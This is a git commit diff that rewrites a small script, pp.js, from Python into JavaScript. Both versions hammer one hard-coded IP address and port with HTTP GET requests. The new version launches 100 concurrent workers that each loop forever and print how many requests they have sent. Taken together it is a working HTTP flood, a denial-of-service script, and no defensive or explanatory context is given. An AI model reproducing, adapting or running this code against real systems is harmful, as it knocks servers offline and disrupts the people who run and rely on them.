4672986b738b90be600cb5c67b62e65b71fde274
tententgc <nyman3527@gmail.com>
2021-09-08 08:53:49 +0700

    Update pp.js

--- pp.js
+++ pp.js
@@ -1,4 +1,9 @@
-import requests
-
-while True:
-  x = requests.get('http://35.192.172.105:8080/ ')
+i=0
+async function spawn () {
+  for(;;) {
+    await require('axios').get('http://35.192.172.105:8080/')
+    i++
+    console.log('sent',i,'requests')
+  }
+}
+for (i = 0; i<100;i++)spawn()
